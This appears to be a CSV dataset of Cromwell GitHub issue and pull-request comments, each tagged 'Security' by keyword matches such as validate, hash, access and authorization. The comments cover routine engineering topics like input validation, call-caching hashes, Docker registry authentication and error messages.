Security,"Note to self- should also validate that the new `Finalizing` workflow state doesn't have unexpected consequences for Rawls and/or the UI (and if it does, I might need to revert)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6196#issuecomment-785993818:26,validat,validate,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6196#issuecomment-785993818,1,['validat'],['validate']
Security,"Note: BT-442 will require an additional change [here](https://github.com/broadinstitute/cromwell/blob/426f722a6c9087213ec6e5d840325c5de088a922/filesystems/drs/src/main/scala/cromwell/filesystems/drs/DrsPathBuilderFactory.scala#L28) (currently being reviewed in #6561) to use the new identity. Since the two identities are just different ways of specifying the same identity, I decided to make both required if one is provided. However, I can remove that piece of validation if y'all feel we shouldn't do that.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6563:463,validat,validation,463,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6563,1,['validat'],['validation']
Security,"Note: the upgraded 1.0 version of this workflow passed validation, so it's something specific to the draft-2 WDL implementation",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3885#issuecomment-404899951:55,validat,validation,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3885#issuecomment-404899951,1,['validat'],['validation']
Security,"Note:. As it stands, this PR could return false positives for a workflow that has been archived from metadata but still has a summary. I think this is already true for the function converted in https://github.com/broadinstitute/cromwell/pull/4617. I'm not sure whether it's a problem per se, but certainly notable. **Update**: based on the analysis in https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053 the old function `validateWorkflowIdInMetadata` already returns `true` for archived workflows.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2435487930:447,validat,validateWorkflowIdInMetadata,447,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2435487930,1,['validat'],['validateWorkflowIdInMetadata']
Security,"Note:. There exists an optional namespace cache in the WDL draft-2 version of `validateNamespace`. WaaS uses only `getWomBundle` and `createExecutable`, so it currently has no interaction with the cache for any language version.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458589241:79,validat,validateNamespace,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458589241,1,['validat'],['validateNamespace']
Security,"Nothing really clever about this PR, just cashing in on past investments in separation of concerns. 1. Remove SBT projects; - Clean compile time 64s -> 53s on M1; - Dependencies removed, no longer subject to security updates or conflicts (see https://github.com/broadinstitute/cromwell/pull/6948); 2. Remove Centaur integration tests; - Slightly improved Travis build time; - Less stuff to port when we leave Travis; 3. Sever connections between CWL and the rest of Cromwell; - Because of Cromwell's extremely compartmentalized design, only two files really reference CWL directly:; - Entry point for server mode; - Entry point for command-line Womtool; - Only small logic updates needed; 4. Can now safely delete top-level `cwl` directory because nothing depends on it. ---. Reviewer's guide:; - Commits up through [Remove obsolete tests](https://github.com/broadinstitute/cromwell/pull/6955/commits/7a26149d9e70818edf852a16b114809ca9c0dc29) are self-contained and pass CI on their own; - [No longer minimal](https://github.com/broadinstitute/cromwell/pull/6955/commits/557d7b72a97651bcdca8ee27590ebfa29473ad05) removes most of the code; - [Remove *.cwl files](https://github.com/broadinstitute/cromwell/pull/6955/commits/eb4eaef0574ec06a256d38bb222d01ebc44a7e9f) speaks for itself",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6955:208,secur,security,208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6955,1,['secur'],['security']
Security,"Now that we're stopping the appenders for workflow logs, access to the underlying Logback context must be synchronized since an underlying non-threadsafe java.util.HashMap is being modified.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3956:57,access,access,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3956,4,"['Hash', 'access']","['HashMap', 'access']"
Security,"OK so can we add validatation for the existence and readability of Files in the workflowinputs.json up front? If there are any issues with shell metacharacters those would be exposed, and I agree that these changes shouldn't have affected the way those are handled.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/249#issuecomment-151545351:17,validat,validatation,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/249#issuecomment-151545351,2,"['expose', 'validat']","['exposed', 'validatation']"
Security,"OK. Let's hard code a `version ""28.1""` in the formula even though it won't match the URL, since that will prevent the checksum error.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316067289:118,checksum,checksum,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316067289,1,['checksum'],['checksum']
Security,"OM)\n# https://askubuntu.com/a/823798\ntail /dev/zero"",; ""shardIndex"": -1,; ""jes"": {; ""endpointUrl"": ""https://lifesciences.googleapis.com/"",; ""machineType"": ""custom-1-2048"",; ""googleProject"": ""encode-dcc-1016"",; ""monitoringScript"": ""gs://caper-data/scripts/resource_monitor/resource_monitor.sh"",; ""executionBucket"": ""gs://encode-pipeline-test-runs/caper_out_10"",; ""zone"": ""us-central1-b"",; ""instanceName"": ""google-pipelines-worker-ead27fbad8aa73b157bfc126cd63331f""; },; ""runtimeAttributes"": {; ""preemptible"": ""0"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""10"",; ""disks"": ""local-disk 10 SSD"",; ""continueOnReturnCode"": ""[0,137]"",; ""docker"": ""ubuntu:latest"",; ""maxRetries"": ""1"",; ""cpu"": ""1"",; ""cpuMin"": ""1"",; ""noAddress"": ""false"",; ""zones"": ""us-central1-b"",; ""memoryMin"": ""2 GB"",; ""memory"": ""2 GB""; },; ""callCaching"": {; ""allowResultReuse"": true,; ""hit"": false,; ""result"": ""Cache Miss"",; ""hashes"": {; ""output count"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""runtime attribute"": {; ""failOnStderr"": ""68934A3E9455FA72420237EB05902327"",; ""docker"": ""A84529F7A095541F1249576699F24AA1"",; ""continueOnReturnCode"": ""614DAABB2D7AAB5D41921614A49E4F92""; },; ""input count"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""backend name"": ""50F66ECBC45488EE5826941BFBC50411"",; ""command template"": ""F41FEBA57D556A16A5F6C4EEF68ED1E0""; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache""; },; ""inputs"": {},; ""backendLabels"": {; ""wdl-task-name"": ""fail-oom"",; ""cromwell-workflow-id"": ""cromwell-87492280-9828-4afa-b53e-bec675103c42""; },; ""labels"": {; ""wdl-task-name"": ""fail_oom"",; ""cromwell-workflow-id"": ""cromwell-87492280-9828-4afa-b53e-bec675103c42""; },; ""failures"": [; {; ""causedBy"": [],; ""message"": ""The compute backend terminated the job. If this termination is unexpected, examine likely causes such as preemption, running out of disk or memory on the compute instance, or exceeding the backend's maximum job duration.""; }; ],; ""jobId"": ""projects/99884963860/locations/us-central1/operations/1374639517116411519"",; ""monitoringLo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5815:4222,hash,hashes,4222,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5815,1,['hash'],['hashes']
Security,"Oh I see, insertion order in a map is definitely NOT preserved currently. They're backed by a classic unsorted HashMap. There would probably be performance implications if we were to switch to LinkedHashMap or a TreeMap to preserve order but maybe a `sort` function on arrays could make this easier.; Tagging @cjllanwarne who might want to chime in as this relates cloesly to WDL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368531271:111,Hash,HashMap,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368531271,1,['Hash'],['HashMap']
Security,"Oh right, I forgot about this comment... sorry :sweat_smile: The issue turned out to be with the call-caching strategy we were using. Because there were a lot of files being created, cromwell needed to do a large amount of hashing, which used up all of the available CPUs eventually leading to the timeouts. We changed the call-caching strategy and are no now longer running into this error.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-432255713:223,hash,hashing,223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-432255713,1,['hash'],['hashing']
Security,"Oh, and the next part of the plan is to delete the buckets to simplify the audit. That's the real purpose here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7533#issuecomment-2334841724:75,audit,audit,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7533#issuecomment-2334841724,2,['audit'],['audit']
Security,"Ok, just for clarification I will do the following:; 1. Remove validateRuntimeValue from wdl4s and create a PR in that repo.; 2. Add validateMemoryValue to JesInitializationActor.; 3. Refactor validateMemoryValue to return similar message than the other ones.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212581683:63,validat,validateRuntimeValue,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212581683,3,['validat'],"['validateMemoryValue', 'validateRuntimeValue']"
Security,"Ok, running the Docker daemon as root is normal (the docs says it's [required](https://docs.docker.com/engine/security/security/), actually). The issues with non-root default users should be fixed in [this PR](https://github.com/broadinstitute/cromwell/pull/1865), but that code is currently only on develop (the forthcoming 25 release). non-root default users should Just Work with the code from that PR, you shouldn't have to make any changes to your config. The `master` branch corresponds to the 24 release; do you mean you're running the 23 release?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2034#issuecomment-283009835:110,secur,security,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2034#issuecomment-283009835,2,['secur'],['security']
Security,"Ok, so validation fails because I had a typo in my input variable name, fine. But TELL ME WHICH VARIABLE IT WAS!!!. The rest of this description is an example:. ```; workflow foo {; 	call bar; 	# Oops, bar didn't have an output called b:; 	call baz as bad_output_name { input: b = bar.b }; 	# Oops, baz doesn't have an input called a:; 	call baz as bad_input_name { input: a = bar.a }; }. task bar {; 	command {; 		# noop; 	}; 	output {; 		String a = ""a""; 	}; 	runtime {; 		docker: ""ubuntu:latest""; 	}; }. task baz {; 	String b; 	command {; 		# noop; 	}; 	runtime {; 		docker: ""ubuntu:latest""; 	}; }; ```. The messages I actually get:; ```; Unable to load namespace from workflow: ERROR: Expression references input on call that doesn't exist (line 4, col 47):. 	call baz as bad_output_name { input: b = bar.b }; ^; Unable to load namespace from workflow: ERROR: Call references an input on task 'baz' that doesn't exist (line 6, col 38). 	call baz as bad_input_name { input: a = bar.a }; ^; ```. The message I want:; ```; Unable to load namespace from workflow: ERROR: Cannot use 'bar.b' as an input. That variable was never created. (line 4, col 47):. 	call baz as bad_output_name { input: b = bar.b }; ^; Unable to load namespace from workflow: ERROR: Call supplies an input 'a' that isn't declared in the 'baz' task (line 6, col 38). 	call baz as bad_input_name { input: a = bar.a }; ^; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2211:7,validat,validation,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2211,1,['validat'],['validation']
Security,"Okay so my understanding of this so far (I'm just reiterating what you have in your diagram for my own benefit):. `ShadowWorkflowActor` has 4 ""lifecycle"" states as actors:; - `MaterializeWorkflowDescriptorActor` - basic validation and `WorkflowDescriptor` creation; - `EngineWorkflowInitializationActor` - spawns 1 or more `BackendWorkflowInitializationActor`, then aggregates results from all of these and message back `ShadowWorkflowActor`; - `EngineWorkflowExecutionActor` - sent a Start or Restart message, performs the execution, sends back result of execution. Spawns `BackendWorkflowExecutionActor`s; - `EngineWorkflowFinalizationActor` - do post-workflow termination actions. Spawns `BackendWorkflowFinalizationActor`s. _I'm just thinking out loud here... if you think this is stupid, I won't feel bad if you ignore me_. I guess the only comments on this scheme are about naming... . I feel like `MaterializeWorkflowDescriptorActor` should follow the same naming scheme and maybe be called something like `EngineWorkflowDescriptorActor` or `EngineWorkflowParserActor`. I'm also not a huge fan of prepending `Engine` onto these actors... maybe we can just drop `Engine`?; - `WorkflowDescriptorActor`; - `WorkflowInitializationActor`; - `WorkflowExecutionActor`; - `WorkflowFinalizationActor`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-209515545:220,validat,validation,220,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-209515545,1,['validat'],['validation']
Security,"On Cromwell version, ""34-5156b78-SNAP"", when making a request to the query endpoint that includes the `""includeSubworkflows"": ""false""` parameter, the database will throw an error if the query matches ~1000 results. . Example POST request:; ```; curl -X POST ""https://cromwell.caas-dev.broadinstitute.org/api/workflows/v1/query"" -H ""accept: application/json"" -H ""authorization: Bearer XXXXX"" -H ""Content-Type: application/json"" -d ""[ { \""status\"": \""Failed\"", \""includeSubworkflows\"": \""false\"" }]""; ```; Error message:; ```; {; ""status"": ""fail"",; ""message"": ""Task slick.basic.BasicBackend$DatabaseDef$$anon$2@27386688 rejected from slick.util.AsyncExecutor$$anon$2$$anon$1@2e52a800[Running, pool size = 200, active threads = 200, queued tasks = 999, completed tasks = 16375]""; }; ```; This error is very similar to the other issue: https://github.com/broadinstitute/cromwell/issues/3115; but `includeSubworkflows` shouldn't limit the number of results the `/query` endpoint can handle.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3873:362,authoriz,authorization,362,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3873,1,['authoriz'],['authorization']
Security,"On hold for now. Using regular auth this appears to work manually but not in code. e.g. doing something like [this](https://docs.aws.amazon.com/AmazonECR/latest/userguide/Registries.html#registry_auth):. ```; TOKEN=$(aws ecr get-authorization-token --output text --query 'authorizationData[].authorizationToken'); curl -i -H ""Authorization: Basic $TOKEN"" https://952500931424.dkr.ecr.us-east-1.amazonaws.com/v2/broadinstitute/cromwell/manfests/latest; ```. returns a blob of JSON containing all sorts of manifesty-looking data. However this doesn't seem to match up exactly with what the current code is doing: . * ~The current code sets `Bearer` auth, but that `curl` command works with `Basic` and not `Bearer`.~ Fixed, that was easy enough; * The current code expects to find the digest in the returned headers. However the digest is in the body and not the headers. It looks like having the `digest` in a `config` block is part of the spec so perhaps the existing code can actually parse and fall back on this if the digest isn't in the headers: https://docs.docker.com/registry/spec/manifest-v2-2/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-486798910:229,authoriz,authorization-token,229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-486798910,4,"['Authoriz', 'authoriz']","['Authorization', 'authorization-token', 'authorizationData', 'authorizationToken']"
Security,"On your last question, yeah that's basically it (although there was a request by Lee to refer to it as a `Path` and there was even some discussion that perhaps it should be cloud URL only so e.g. `CloudPath`). Despite the nomenclature the idea would be a type which would be treated as a String except that Cromwell would understand that it represents a file for things like call caching and handle them appropriately. Unlike a `File` the underlying path is never localized, it's always maintained as-is. Coercion between `File` and this new type would be seamless. I'll use `FileRef` for examples w/o necessarily endorsing that term. In a much simpler example where you have a single `FileRef` it'd be treated just like a `String` when it came to a command block, e.g. task foo {; FileRef bar; File baz. command {; grep ${bar} ${baz}; }; }. This would be grepping the delocalized path referenced by `bar` in the contents of the localized file `baz`. For the `Array[FileRef]`/`writelines()` examples, the belief was that if the writelines was in the command block (or the declaration? crap, now I forget which) that call caching would work as desired as the individual `FileRef`s would have their hashes checked *prior* to the FOFN generation. Moving away from your specific situation, I alluded to `CloudPath` above. The reason this came up in a separate context was e.g. GATK4's NIO capability where one doesn't want to be localizing files but does want call caching to be in effect. So there was a request for this concept of a file like thing which stays where it originally is. Some tricky edge cases start coming up when you're talking about actual local files for this and all the examples people came up with were people using cloud based storage, thus .....",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305979013:1197,hash,hashes,1197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305979013,2,['hash'],['hashes']
Security,"Once wdl4s memory validation removal PR is merge, enable ignored unit test cases and create missing one if there is one for this functionality.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/726:18,validat,validation,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/726,1,['validat'],['validation']
Security,"One of Morgan's input files was missing an md5 in its object metadata. Cromwell was dutifully falling back to our backup option, which is to read every byte of the file into memory and calculate the hash itself. This resulted in extraordinary network and CPU usage that destabilized the instance and caused a continual crash/reboot cycle. We think this is also what Lori ran into with the featured workspaces. Now, we detect & avoid this condition, print a warning, and carry on without call caching:; ```; 41183c60:ImputationBeagle.SubsetVcfToRegion:3:1:; Hash error ([Attempted 1 time(s)] - Exception:; File of type BlobPath requires hash in object metadata, not present for; https://lz8b0d07a4d28c13150a1a12.blob.core.windows.net/sc-94fd136b-4231-4e80-ab0c-76d8a2811066/hg38/inputs/palantir_merged_input_samples.liftedover.vcf.gz),; disabling call caching for this job.; ```. Obviously, we'd like to enhance this in the future so that call caching is still possible for these jobs, but we have to walk before we can run. ---. Visualization eye candy section!. Swiftly downloading a file on the datacenter multi-gigabit LAN:. ![Screenshot 2024-05-02 at 19 24 04](https://github.com/broadinstitute/cromwell/assets/1087943/46484bbd-30e0-4f88-8f6c-05b50649c557). Telltale CPU curve as we chew through one file after another:. ![Screenshot 2024-05-03 at 11 32 13](https://github.com/broadinstitute/cromwell/assets/1087943/7916ce63-8d4c-46f7-a86a-b3313edf0d77). Flame graph showing the smoking gun, `generateMd5FileHashForPath`:. ![Screenshot 2024-05-02 at 14 02 25](https://github.com/broadinstitute/cromwell/assets/1087943/0d06f3ad-8155-4b43-bef7-6d9ccce35132)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7419:199,hash,hash,199,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7419,3,"['Hash', 'hash']","['Hash', 'hash']"
Security,"Only the refresh-token mode requires new credentials to be created/validated for every workflow, all other modes can be validated only from the configuration. This ensures we don't re-create unnecessary auth modes.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1429:67,validat,validated,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1429,2,['validat'],['validated']
Security,Only try to inject a refresh_token when asked.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2511:12,inject,inject,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2511,1,['inject'],['inject']
Security,"Ooop, I might have misspoke. I thought the copy strategy did actually log that it was copying, but I realised that what I was seeing was that the `hard link` had failed, and knew that it was copying based on that:. > `WARN - Localization via hard link has failed: /path/to/destination.file -> /path/to/original.file: Invalid cross-device link`. I think it still might be useful, but I realise there's actually no precedent here. ---. Oh, so the path+modtime sort of just works? I was under the impression it wouldn't for those cache-strategies. I don't know if it wouldn't try, or would never succeed because I never tried, but here's what the [docs say](https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options):. > - ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; > - ""path+modtime"" will compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here. Thanks for the reply!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-508309219:769,hash,hash,769,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-508309219,2,['hash'],['hash']
Security,Oops I just opened #1888 which is effectively a dup of this. I'll just add some notes here instead. We discussed in person that the key stakeholders wanted this to always happen a couple of times and that we would not expose this as an option for now. . IMO I would prefer to see this sort of JES-backend-specific retrying being handled as part of the backend's responsibility. I haven't looked closely at the code to assess how much that desire makes sense,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1849#issuecomment-274350954:218,expose,expose,218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1849#issuecomment-274350954,1,['expose'],['expose']
Security,Open HTTP channels for Martha Access URL BT-193,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6351:30,Access,Access,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6351,1,['Access'],['Access']
Security,"Original report:; https://gatkforums.broadinstitute.org/firecloud/discussion/10434/weird-error-message-encountered-www-googleapis-com. ![screen shot 2018-09-27 at 2 10 26 am](https://user-images.githubusercontent.com/14941133/46126308-bbb53580-c1fa-11e8-9001-2a662b9374dd.png). Here is an example of a workflow that fails with not being able to access www.googleapis.com. Its not implicitly obvious to a user what the consequences of this are and whether it makes sense to re-run their workflow. . In the case above -- it seems like the job that failed with this error had an rc of 0 and the expected outputs were present -- so likely the output evaluation failed, or some other file operation never completed as this is a StorageException. AC: Supplement the existing top-level message with something like ```Please consult this https://status.cloud.google.com/ to ensure that there are no reported outages with the Google Cloud Platform. Otherwise, this is likely a transient error and the workflow should be re-run.```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4159:345,access,access,345,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4159,1,['access'],['access']
Security,"Overall I'm liking the `Validation` angle to these changes, this seems like a nice system which could be used in other spots in Cromwell. I think the attribute parsing could be made more tolerant so that Kristian's examples of `8G` and `8GB` actually would parse, but that's orthogonal to getting helpful error messages when something is unparseable. I'm happy to address more tolerant parsing in a separate PR. Also, it feels like the case classes might have been overused in these changes; they aren't replacing type aliases but are wrapping what used to be raw types. This does buy some added type safety in . ``` scala; (failOnStderr |@| cpu |@| preemptible |@| disks |@| memory){ RuntimeAttributes(docker, zones, _, _, _, _, _) }; ```. But then everywhere else there's noise for boxing and unboxing the raw types to and from these case classes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/163#issuecomment-135972385:24,Validat,Validation,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/163#issuecomment-135972385,1,['Validat'],['Validation']
Security,"P.S. the current docs advise including the sha256 hash in the docker runtime spec:; https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#image-versions; Which makes sense, but unfortunately right now it seems to disable caching (at least with the Local backend).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4912#issuecomment-488707414:50,hash,hash,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4912#issuecomment-488707414,1,['hash'],['hash']
Security,PAPI V1 had a different way of handling private dockerhub credentials and there needs to be a new methodology to pass credentials for operations in PAPI v2. . Implement a system that allows a user to be able to pass in dockerhub credentials securely to their jobs container so a user can pull private docker images.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3844:241,secur,securely,241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3844,1,['secur'],['securely']
Security,"PAPI error code 2. Execution failed: pulling image: docker login: generic::unknown: retry budget exhausted (10 attempts): running docker login: exit status 1 (standard error: ""WARNING! Using --password via the CLI is insecure. Use --password-stdin.\nError response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers). Seen [here](https://gotc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-cron-papiv2/170)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4438:193,password,password,193,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4438,2,['password'],"['password', 'password-stdin']"
Security,PAPIv2 upgrade test requires secure,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4196:29,secur,secure,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4196,1,['secur'],['secure']
Security,PR 3 of 3:; 1. Remove cromwell-core dependency from cloud-support; 2. Run jes centaur on travis; 3. Generate coverage for integration tests. ---. Publishing test validates executables and cross-versioned libraries/docs.; Updated run_tests_parallel.sh for centaur monorepo.; Quieted centaur runs of sbt assembly and coverage gen/upload.; Don't run problematic no_new_calls on TES.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2955:162,validat,validates,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2955,1,['validat'],['validates']
Security,"Pair accessing was never added properly to the docs.; When a pair is accessed incorrectly, it'd be nice to have an error along the lines of `use pair.left and pair.right to access Pair members`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2300:5,access,accessing,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2300,3,['access'],"['access', 'accessed', 'accessing']"
Security,"Partially answering my own question: https://github.com/juliangehring/GMAP-GSNAP/blob/master/src/access.c#L595-L623. If the `shmget` on line `595` succeeds because an existing shared memory segment exists, then we enter the `else if` block and end up printing `Attached existing memory`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4465#issuecomment-446377103:97,access,access,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4465#issuecomment-446377103,1,['access'],['access']
Security,"Per @davidbernick's comments on Slack, this guide should include how Cromwell administrators should set up Authorization, Authentication, Encryption, and Persistent Databases. This guide will be created during the [Doc-A-Thon](https://docs.google.com/document/d/1M5u-ESSpt_eM0ORsvIu2AoOtvYXImPmAKoyvXFo4p9s/edit) in November.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2327#issuecomment-332204672:107,Authoriz,Authorization,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2327#issuecomment-332204672,3,"['Authenticat', 'Authoriz', 'Encrypt']","['Authentication', 'Authorization', 'Encryption']"
Security,"Per my investigation of #1740 I can confirm the validation is running synchronous to submission, which it should not be. But the API is returning an error for malformed input and not just timing out.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328286341:48,validat,validation,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1882#issuecomment-328286341,1,['validat'],['validation']
Security,"Per the linked forum post, add an option to turn off Docker hash lookups with the understanding that this would not be compatible with call caching. https://gatkforums.broadinstitute.org/wdl/discussion/10279/problem-with-docker-images-pulled-self-hosted-registries",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2600:60,hash,hash,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2600,1,['hash'],['hash']
Security,"Perf testing has shown that removing this query improves CC time and reduces DB load (see last row in CC google doc); Unclear if it's worth keeping it as a configurable thing ?; This keeps storing the individual hashes, it just stops using them for ""fast"" cache miss detection.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4121:212,hash,hashes,212,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4121,1,['hash'],['hashes']
Security,Persist the encrypted refresh token. Closes #999,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1000:12,encrypt,encrypted,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1000,1,['encrypt'],['encrypted']
Security,Phase two of Hashing for Call Caching.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1964:13,Hash,Hashing,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1964,1,['Hash'],['Hashing']
Security,"Pipeline developers like me would benefit from being able to parse the wdl language model so I can write tests that aren't covered by the current wdltool validate. . I hear this could be easily accomplished by wdl4s dumping to json, which users could then parse with custom tools. . Desired tests:; 1. Specified inputs exist and are accessible (depends on backend); 2. Docker images exist and can be read/pulled; 3. dependencies.zip contains all of the necessary files to run the workflow.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3502:154,validat,validate,154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3502,2,"['access', 'validat']","['accessible', 'validate']"
Security,"Please callcache based on Docker image hashes, not the image string + tag",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1617:39,hash,hashes,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1617,1,['hash'],['hashes']
